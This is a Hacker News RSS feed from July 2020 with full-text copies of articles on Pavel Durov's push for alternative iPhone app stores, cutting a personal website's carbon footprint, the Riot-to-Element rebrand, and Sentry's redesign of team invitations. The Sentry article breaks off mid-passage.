<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 20]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 20. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 17 Jul 2020 08:18:04 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-20.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 17 Jul 2020 08:18:04 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Pavel Durov wants a law to make Apple allow iPhone users install other app store]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 6 (<a href="https://news.ycombinator.com/item?id=23843296">thread link</a>) | @vvpvijay
<br/>
July 15, 2020 | https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8890"><div><div><div><p>VK social networking website and Telegram messenger App founder and developer, Pavel Durov wants Apple to let iPhone users install different App stores other than Apple App Store. Not only that, but he also wants legislation to make this happen.</p><p>Speaking at the panel discussion with Russian Prime Minister Mikhail Mishustin and representatives of the IT industry in Innopolis, Telegram Manager and Vice President, Ilya Perekopsky said that Apple and Google are holding back the development of startups by charging a tax of 30 percent commission from app developers. Immediately after Perekopsky’s speech,&nbsp;Durov published an article in which he called for legislation mandating Apple to be legally obliged to allow users to install an alternative App Store on the iPhone. Durov says that Tim Cook, Apple CEO should be obligated to this at the legislative level.</p><p>Durov is taking the bull by its horn. Apple has been successful because of its closed technology. It not only does not allow any other App store to be installed on iPhones but it also takes action against any iPhone jailbreaks that happen. We all know that the <a href="https://androidrookies.com/unc0ver-jailbreak-tool-for-iphone-released-works-on-all-ios-versions-including-ios-13-5/">uc0ver team released a jailbreak</a> exploiting the previously unknown vulnerability in iOS just hours after Apple released iOS 13.5. The <a href="https://androidrookies.com/kernel-vulnerability-unc0ver-jailbreak-patched-as-apple-releases-ios-13-5-1/">iPhone jailbreak was shut down in iOS 13.5.1</a> within days by Apple. Many private iPhone App stores exist like Cydia, Xabsi, etc but they work only on jailbroken iPhones.</p><p>Much of Apple’s profit is from selling content on its App stores. In fact, Apple’s App Store platform grossed around $50 billion for App store in 2019, according to an analysis by CNBC. Apple takes 30 percent commission from App developers to make their apps available on Apple Store. Last year it paid $35 billion to developers from the App store revenue and kept $15 billion for itself.</p><p>Durov has reasons for being mad at Apple for not allowing other App stores. Durov says that Russian startups fail to make money by paying 30% to Apple. “Preventing two supranational corporations from collecting taxes from all of humanity is not an easy task. Corporations employ thousands of lobbyists, lawyers, and PR agents, and their budgets are unlimited. At the same time, app developers are scattered and scared, as the fate of their projects depends entirely on the favor of Apple and Google,” wrote Pavel Durov.</p><p>Durov also has a personal bias for wanting Apple to open up its iOS for alternative App stores. In 2016, Apple banned the Telegram team from launching its own game platform. This hurt Durov and Telegram’s ambitions, “We had to remove the telegram games catalog that we had already created and almost the entire platform interface, otherwise Apple threatened to remove Telegram from the AppStore.”</p><p>Recently, <a href="https://androidrookies.com/apple-threatens-to-remove-hey-com-email-app-unless-it-pays-outrageous-cuts-to-them/">email client, Hey.com</a> had a similar experience with Apple regarding publishing their App on the Apple App store.</p></div></div></div></article></div>]]>
            </description>
            <link>https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843296</guid>
            <pubDate>Wed, 15 Jul 2020 10:21:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This Website Is Killing the Planet]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 11 (<a href="https://news.ycombinator.com/item?id=23842225">thread link</a>) | @brokebroadbeat
<br/>
July 15, 2020 | https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/ | <a href="https://web.archive.org/web/*/https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>For a while I’ve been intending to make my website more sustainable, but I succumbed, as I often do, to the human trait of sloth. But this morning after reading <a href="https://alistapart.com/article/webwaste/">Gerry McGovern’s post on webwaste</a>, I thought I’d procrastinated long enough.</p>

<p>So I ran a web page performance test and got some <a href="https://www.webpagetest.org/result/200713_XX_e2daed33a24cd8a099d930fc373b1083/">grim results</a>: my website takes over a minute to load on a Moto G4 on using 3G data networks. It’s just as bad <a href="https://www.webpagetest.org/result/200713_6E_4e249b485a45882604420068caa21ae0/">using a desktop PC in Nottingham on 1.5Mbps DSL</a>. My website is bloated with large images and a bunch of JavaScript, which means it’s eating up lots of energy transmitting those bits and bytes.</p>

<p>But how much energy? I used the <a href="https://www.websitecarbon.com/">Website Carbon Calculator</a> to find out. Turns out that</p>

<ul>
  <li>6.90g of CO2 is produced every time someone visits the homepage</li>
  <li>it emits the amount of carbon that 4 trees absorb in a year, and</li>
  <li>it uses enough electricity to drive an electric car 1,116km</li>
</ul>

<p>Eugh. That’s disgusting. For each year my website has been online, I should have planted 4 trees just for the homepage alone. But, instead, my laziness has filled the atmosphere with more and more carbon.</p>

<p>I have to do something, this has gone on long enough, so I’m committing to some actions.</p>

<ol>
  <li>I’ll move my site to a web hosting provider using renewable energy, one that’s listed on the <a href="https://www.thegreenwebfoundation.org/directory/">Green Web Foundation’s directory</a>. <strong>DONE</strong></li>
  <li>I’ll compress and optimise the images on my site using <a href="https://imageoptim.com/mac">ImageOptim</a>. <strong>DONE</strong></li>
  <li>I’ll get rid of <a href="https://github.com/samesies/barber-jekyll">my energy-guzzling site theme</a> until I can introduce one that’s lightweight and accessible. <strong>DONE</strong></li>
  <li>Going forward, my website will enshrine the principles of the <a href="https://www.sustainablewebmanifesto.com/">Sustainable Web Manifesto</a>. <strong>SIGNED</strong></li>
  <li><strong>NEW</strong>: I’ll pay for some trees to be planted that’ll reduce the impact of my website’s carbon footprint going forward.</li>
</ol>

<p>To show my committment to being a good web citizen, I’ll add the <a href="https://www.websitecarbon.com/badge/">Website Carbon Badge</a> to all pages (<strong>DONE</strong>) and the <a href="https://www.thegreenwebfoundation.org/green-web-check/">Green Web Foundation’s renewable hosting badge</a> (<strong>DONE</strong>). Once I’ve improved things, I’ll add a <a href="https://carbontxt.org/">carbon.txt</a> (<strong>DONE</strong>).</p>

<p>One day I’ll actually get around to building a solar-powered battery bank and run my site off my home connection, but until then I’m taking small steps to remove, minimise and clean-up my presence on the web.</p>

<p>What’s the carbon footprint of your website? What steps will you take to reduce it?</p>

<h2 id="further-reading">Further reading</h2>

<ul>
  <li><a href="https://alistapart.com/article/webwaste/">Webwaste</a></li>
  <li><a href="https://pxlnv.com/blog/bullshit-web/">The bullshit web</a></li>
  <li><a href="https://www.wholegraindigital.com/blog/sustainable-web-design/">3 steps to creating zero carbon websites</a></li>
  <li><a href="https://solar.lowtechmagazine.com/2018/09/how-to-build-a-lowtech-website.html">How to build a low-tech website</a></li>
  <li><a href="https://www.thegreenwebfoundation.org/news/notes-for-greening-internet-governance-at-eurodig/">Greening Internet governance: environmental sustainability and digital transformation</a></li>
</ul>

  </div>
</article>



      </div>
    </div></div>]]>
            </description>
            <link>https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842225</guid>
            <pubDate>Wed, 15 Jul 2020 07:15:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Riot is now Element]]>
            </title>
            <description>
<![CDATA[
Score 413 | Comments 254 (<a href="https://news.ycombinator.com/item?id=23842179">thread link</a>) | @J_tt
<br/>
July 15, 2020 | https://element.io/blog/welcome-to-element/ | <a href="https://web.archive.org/web/*/https://element.io/blog/welcome-to-element/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everyone,</p><p>We are incredibly excited to announce that <strong>Riot is now Element</strong>! </p><p>In fact we have simplified all our naming: Element is also the name for New Vector (the company behind Riot) while Modular, our flagship Matrix hosting service, has become Element Matrix Services.</p><p>For those discovering us for the first time: Element is the flagship secure collaboration app for the decentralised <a href="https://matrix.org/">Matrix</a> communication network. &nbsp;Element lets you own your own end-to-end encrypted chat server, while still connecting to everyone else in the wider Matrix network.</p><figure><img src="https://element.io/blog/content/images/2020/07/element-logo.png"></figure><p><br>What’s more, <strong>RiotX is now out of beta</strong> - our next generation Matrix client for Android has flown the nest and spread its wings as Element - replacing the old Riot Android app at last!</p><p>This name change has been a long time in the making. As we explained when we announced the rebrand <a href="https://blog.riot.im/the-world-is-changing/">a few weeks ago</a>, we’ve had major issues with a certain gigantic games company which has blocked us from being able to trademark Riot or even Riot.im - a huge issue when it comes to defending users against abusive forks of the app. Secondly, people incorrectly assume Riot refers to violence, rather than the more constructive forms of chaos we had in mind. Lastly, it made sense in the early days of Matrix to have different brands to illustrate the different roles of Riot, Modular and New Vector in the ecosystem… but nowadays there are loads of Matrix clients, Matrix hosting providers and companies building on Matrix - and so all New Vector’s different names were just causing confusion. &nbsp;</p><h3 id="so-why-element">So, why Element?</h3><p>We want a name that reflects the emphasis on simplicity and clarity that we aimed for when designing RiotX; a name that highlights our single-minded mission to make Element the most elegant and usable mainstream comms app imaginable. &nbsp;Riot had a pretty chequered history, spending much of its life in beta, with intermittent attention to design until we hit 1.0 last year - but nowadays we have a dedicated full-time design team working on Element, who not only design the graphics but the overall behaviour of new features in the app. &nbsp;This is not an easy task, given it turns out the hardest bits of end-to-end encryption are almost entirely UX challenges. &nbsp;What’s more, presenting a global decentralised communication network as simply as a centralised communication island is surprisingly tricky. &nbsp;However: we have been making massive progress, to the extent that we are barely recognisable as the Riot of the past. Element reflects a clean start to focus monomaniacally on mainstream usability in future.</p><p>We also want a name that better evokes the idea of data ownership and self-sovereignty. &nbsp;An element is the smallest indivisible thing in a system - yet one which can stand alone. &nbsp;You can customise it, control it and make it your own - you can literally be in your Element!</p><p>Moreover, we want a name that will be future-proof for peer-to-peer Matrix. &nbsp;As Matrix.org announced last month, <a href="https://matrix.org/blog/2020/06/02/introducing-p-2-p-matrix">P2P Matrix is in heavy development</a> - and we can see a world where Element will literally be an element of Matrix, running your own homeserver within the app, so you can communicate if you don’t have a server… or even Internet. In fact, we published the first experimental build of <a href="https://matrix.org/blog/2020/07/10/this-week-in-matrix-2020-07-10#riot-ios-p2p-demo">P2P Riot for iOS</a> on Testflight a few days ago - so we can clearly see a future where we will be in our P2P element!</p><p>Finally, we think it’s a cool name :D &nbsp;It fits in nicely with the term Matrix while not being as nerdy as Vector. &nbsp;We’re obviously aware that Element is (once again) both a dictionary word and a mathematical term - but in practice, looking at search results for Element right now, the top hits are for dictionary sites(!) and the field is wide open. &nbsp;Conversely, in a virgin browser on VPN, Riot is the 4th hit on Google for Riot; second only to a certain games company. &nbsp;In other words, we’ve shown that we can successfully adopt dictionary words - and if you do find yourself lost searching in a maze of mathematics, just throw in the word ‘chat’ to get back on track. &nbsp;(For all the linear algebraists who are spitting with rage at this point: we promise we’ll make it up to you by finally sorting out <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3251">latex support</a> in Element!)</p><p>This change is inevitably going to be disruptive, and we’re painfully aware that we’ve spent four years building up Riot’s reputation and persuading everyone to move their friends, families and teams onto it. &nbsp;To reiterate what we said when we announced the change, we know that many people reading this will have put their necks on the line to get folks to adopt Riot, and we really appreciate how frustrating it may be to have to explain the change to your users. &nbsp;However, this is unquestionably the right time to shed our skin and make the change, and we hope folks will grow to love Element much more than they ever did Riot. &nbsp;To aid the transition, we’ve named the installable apps “Element (Riot.im)” for a while to help people get reoriented (e.g. when searching by name for Riot).</p><p>Last but not least: Element isn’t just a new name - it comes with a massive suite of improvements across Android, iOS and Web.</p><p>We’ll write about these in full over the coming days, but the big headlines are that RiotX (our ground-up rewrite of Riot Android) has exited beta, and replaces Riot Android as Element - complete with VoIP calls and Widget support! Riot Android users will magically autoupgrade into Element; the old RiotX app will be retired in due course. FDroid is likely releasing Element as an entirely new app. &nbsp;Meanwhile On iOS we now have full support for iOS 13, complete with entirely new push notification support (thanks to Apple’s nightmarish <a href="https://appleinsider.com/articles/19/09/05/secure-messaging-apps-working-to-comply-with-apples-ios-13-privacy-changes">deprecation of PushKit</a>).</p><figure><img src="https://element.io/blog/content/images/2020/07/RiotX-1.png"><figcaption>The App Formerly Known As RiotX!</figcaption></figure><p>On Element Web, we’ve given the UI a massive refresh, with a beautiful new font (<a href="https://rsms.me/inter/">Inter</a>) giving much improved legibility, and we’ve <strong>completely</strong> rewritten the Room List control - adding in room previews(!!), alphabetic ordering, resizable lists, improved notification UI and more. We’ve also landed the first phase of further improving the end-to-end encryption setup process - letting users generate a recovery key rather than forcing them to select a recovery passphrase when setting up E2EE for the first time (the next phase is to delay setting up E2EE until the user actually starts talking in encrypted rooms).</p><figure><img src="https://element.io/blog/content/images/2020/07/Screenshot-2020-07-15-at-00.54.45.png"></figure><p>So there you have it. Welcome to a whole new beginning for Riot: welcome to your new Element, one where mainstream Matrix users will enjoy themselves too - and which will pave the way for wider adoption of open, secure, decentralised communication via Matrix throughout the world.</p><p>- Matthew, Amandine, and the whole Element team.</p><p>P.S. Check out our <a href="https://element.io/">all-new website</a> and in particular the <a href="https://element.io/previously-riot">migration page</a> for much more information about our brave new world!<br></p></div></div>]]>
            </description>
            <link>https://element.io/blog/welcome-to-element/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842179</guid>
            <pubDate>Wed, 15 Jul 2020 07:07:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we grew Sentry's monthly active users by rethinking invitations]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23841049">thread link</a>) | @bentlegen
<br/>
July 14, 2020 | https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations | <a href="https://web.archive.org/web/*/https://blog.sentry.io/2020/02/12/how-we-grew-sentrys-monthly-active-users-by-rethinking-invitations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><time datetime="2020-02-12T00:00">February 12, 2020</time><div><p>At its core, Sentry is a tool that alerts you to defects in your production software. But it does more than blast stack traces into your inbox: Sentry provides powerful workflows to help your team determine root cause, <a href="https://blog.sentry.io/2019/02/07/sentry-workflow-triage">triage issues</a> to your team, and keep tabs on ongoing concerns with comments and notifications.</p>
<p>These collaborative features can help you resolve problems with your software quickly. But the keyword here is <strong>collaborative</strong>; without your full team having access to Sentry, you may find yourself quickly becoming overwhelmed with an endless backlog of issues and no one to help.</p>
<p>At the end of 2019, the Growth team made it our mission to make it easier for our users to invite their teammates to join them on Sentry. To achieve this, we tackled three distinct areas:</p>
<ol>
<li>Surfacing the ability to invite users contextually</li>
<li>Expanding Sentry’s permission model to allow <em>more types of users</em> to send invitations </li>
<li>Allowing external users to request access themselves</li>
</ol>
<p>Our theory: improving the user experience of inviting users, <em>as well as</em> democratizing the process to include all team members would lead to a significant increase in team-wide adoption. <em>(Narrator: it did.)</em></p>
<h2 id="the-status-quo"><a href="#the-status-quo" aria-label="the status quo permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>The status quo</h2>
<p>Before we get deep into what we changed and how it impacted the bottom line, let’s quickly revisit how user invitations worked: the <em>Add Member to Organization</em> page you see below.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=233 233w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=465 465w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?fm=webp&amp;w=930 930w" sizes="(max-width: 800px) 100vw, 800px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=233 233w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=465 465w,
https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png?w=930 930w" sizes="(max-width: 800px) 100vw, 800px">
          <img alt="1-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/6BLSaoIQWaMkETq7E0Th9b/b61433d66e986f44e19d25c01f5186d1/1-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>This full-page experience, tucked away deep in Sentry’s account settings, had a number of issues:</p>
<ol>
<li>Since this is a full page, reaching it meant you would be taken out of context of whatever you were doing previously</li>
<li>Its location deep in our navigation hierarchy meant discoverability was poor</li>
<li>It’s <em>unclear</em> you can actually invite multiple people at once (you can!)</li>
<li>When inviting multiple users, you could only assign the group to the same role and collection of teams</li>
</ol>
<p>Interestingly, to improve discoverability, we had previously introduced a number of “quick links” to reach this page more easily. But these links were scattered around the application, and didn’t appear contextually when users signaled intent to invite members.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4xiHp1Gl0HaZ0l8USGDPLr/79402583357d98cf55ad2dfda6ffe537/2-invitations.png" alt="" title="2-invitations"></p></figure><div>
<p>These user experience and discovery challenges felt like obvious starting places. But instead of just settling for a new “improved” form, we decided to rethink the entire experience from the ground up.</p>
<h2 id="the-new-member-invitation-modal"><a href="#the-new-member-invitation-modal" aria-label="the new member invitation modal permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>The new member invitation modal</h2>
<p>It’s probably not a surprise that our first instinct was to convert this page into a modal –&nbsp;one that manages to squeeze all of the capabilities shown earlier into a smaller, more concise experience. It actually does one better: the modal is clearer in indicating that you can invite multiple users, and allows you to set unique permissions for each invitee.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=190 190w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=381 381w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?fm=webp&amp;w=761 761w" sizes="(max-width: 761px) 100vw, 761px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=190 190w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=381 381w,
https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif?w=761 761w" sizes="(max-width: 761px) 100vw, 761px">
          <img alt="3-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/xP7CehFwrtHYSvw9T3v7r/f67674006a888517f98422f47a3883a8/invitation-modal-tutorial.gif" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>While modals are sometimes overused in web applications, we believed this approach would solve our key discoverability and navigation concerns: it can be shown contextually without leaving the current page, and completing the form returns you to what you were doing.</p>
<p>To that point, we additionally introduced buttons to launch this <em>Invite New Members</em> modal contextually throughout Sentry:</p>
<ul>
<li>Viewing an issue and notice a <a href="https://docs.sentry.io/workflow/releases/?platform=node#after-associating-commits">suspect commit</a> made by a coworker? If they’re not already part of your Sentry organization, you can now invite them then and there.</li>
<li>Trying to assign an issue to a team member, but don’t see their name in the assignee list? You now have the option to invite them right in the dropdown.</li>
<li>Creating a new team? Now you can invite new members directly to that team as you go.</li>
</ul>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/60GpNeFNg4toier5a02zh4/ba868de307b0dcc6764805901b0b6e93/4-invitations.png" alt="" title="4-invitations"></p><figcaption><p>Example contextual link that launches the Invite New Members modal</p></figcaption></figure><div>
<h2 id="democratizing-invitations"><a href="#democratizing-invitations" aria-label="democratizing invitations permalink"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M10.8786797,6.05025253 L15,1.92893219 C16.7967298,0.132202428 19.6206785,-0.0112433245 21.5814287,1.49859493 C21.7515515,1.62959474 21.9151761,1.77304049 22.0710678,1.92893219 C24.0236893,3.88155365 24.0236893,7.04737854 22.0710678,9 L17.9497475,13.1213203 C17.5592232,13.5118446 16.9260582,13.5118446 16.5355339,13.1213203 C16.1450096,12.7307961 16.1450096,12.0976311 16.5355339,11.7071068 L20.6568542,7.58578644 C21.8284271,6.41421356 21.8284271,4.51471863 20.6568542,3.34314575 C19.4852814,2.17157288 17.5857864,2.17157288 16.4142136,3.34314575 L12.2928932,7.46446609 C11.9023689,7.85499039 11.2692039,7.85499039 10.8786797,7.46446609 C10.4881554,7.0739418 10.4881554,6.44077682 10.8786797,6.05025253 Z M13.1213203,17.9497475 L9,22.0710678 C7.04737854,24.0236893 3.88155365,24.0236893 1.92893219,22.0710678 C-0.0236892706,20.1184464 -0.0236892706,16.9526215 1.92893219,15 L6.05025253,10.8786797 C6.44077682,10.4881554 7.0739418,10.4881554 7.46446609,10.8786797 C7.85499039,11.2692039 7.85499039,11.9023689 7.46446609,12.2928932 L3.34314575,16.4142136 C2.17157288,17.5857864 2.17157288,19.4852814 3.34314575,20.6568542 C4.51471863,21.8284271 6.41421356,21.8284271 7.58578644,20.6568542 L11.7071068,16.5355339 C12.0976311,16.1450096 12.7307961,16.1450096 13.1213203,16.5355339 C13.5118446,16.9260582 13.5118446,17.5592232 13.1213203,17.9497475 Z M4.75735931,17.8284271 L17.8284271,4.75735931 C18.2189514,4.36683502 18.8521164,4.36683502 19.2426407,4.75735931 C19.633165,5.1478836 19.633165,5.78104858 19.2426407,6.17157288 L6.17157288,19.2426407 C5.78104858,19.633165 5.1478836,19.633165 4.75735931,19.2426407 C4.36683502,18.8521164 4.36683502,18.2189514 4.75735931,17.8284271 Z" fill="currentColor">
  </path>
</svg>
</a>Democratizing invitations</h2>
<p>As we began rolling out our new <em>Invite New Members</em> experience across the application, we came to a sobering realization: only roughly <strong><em>half</em></strong> of Sentry users could actually use our new modal. That’s because historically, only those with Owner or Manager-level permissions could invite other team members. Combined, users with these permissions accounted for less than 50% of active users.</p>
<p><a href="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png" target="_blank" rel="noopener">
          <span>
        <span>
          <picture>
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=123 123w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=245 245w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?fm=webp&amp;w=490 490w" sizes="(max-width: 490px) 100vw, 490px" type="image/webp">
          <source srcset="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=123 123w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=245 245w,
https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png?w=490 490w" sizes="(max-width: 490px) 100vw, 490px">
          <img alt="5-invitations" title="" src="https://images.ctfassets.net/em6l9zw4tzag/5fURXm9mS5xbmyG3kgUakB/ed4cfdbcf818ed596cce78e937f246a3/5-invitations.png" loading="lazy">
        </picture>
        </span>
      </span>
        </a></p>
<p>Restricting the ability to add new users to account administrators is pretty common practice for software tools, and Sentry is no exception. When an employee onboards on a new team, it’s common to see an exchange like this:</p>
<blockquote>
